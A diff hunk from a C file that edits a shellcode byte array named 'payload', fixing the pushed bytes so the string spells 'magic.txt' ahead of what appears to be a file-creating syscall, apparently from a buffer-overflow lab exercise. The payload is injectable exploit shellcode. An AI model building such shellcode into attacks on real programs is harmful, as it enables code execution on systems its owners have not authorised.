@@ -26,8 +26,8 @@ unsigned char payload[] =
 	/* FIXME */
 	/* ------------------------------------	*/
    "\x6a\x74"	    			// push magic.txt
-   "\x68\x63\x78\x74\x2E"
-   "\x68\x6D\x61\x67\x69"
+   "\x68\x63\x2e\x74\x78"
+   "\x68\x6d\x61\x67\x69"
    "\x89\xe3"               	//mov    %esp,%ebx
    "\x6a\x01"                	//push   $0x1
    "\x59"                   	//pop    %ecx
